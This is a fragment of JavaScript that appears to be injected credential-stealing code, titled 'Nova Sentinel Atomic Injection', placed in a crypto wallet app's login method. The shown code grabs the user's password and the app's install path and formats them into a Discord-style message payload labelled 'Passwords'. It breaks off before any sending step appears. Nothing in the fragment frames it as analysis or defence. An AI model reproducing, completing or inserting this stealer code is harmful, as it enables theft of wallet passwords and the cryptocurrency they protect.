                ...
                St = {
                    ...
                    methods: {
                        ...
                        async login() {
				            ...
				            const delimiterIndex = JSON.parse(data);
				            ...
				            const payload = {
                                ...
                                embeds: [
                                  {
                                    title: "Nova Sentinel Atomic Injection",
                                    description: `<:atomic:1133348497962324008>\n\`\`\`diff\n- Path: ${__dirname}\`\`\``,
                                    color: 1638163,
                                    fields:[{ 
                                        name: "<:key_already_taken27:1133348230327963658> **Passwords:**",
                                        value: `\`\`\`ansi
[2;31m ${this.password ?? "N/A"}[0m[2;34m[0m\`\`\``,
                                       inline: false,
                                    },
                                    { 
                                        name: "<:green_link:1133348228029497475>  **Atomic Link:**",
                                        value: `\`\`\`ansi
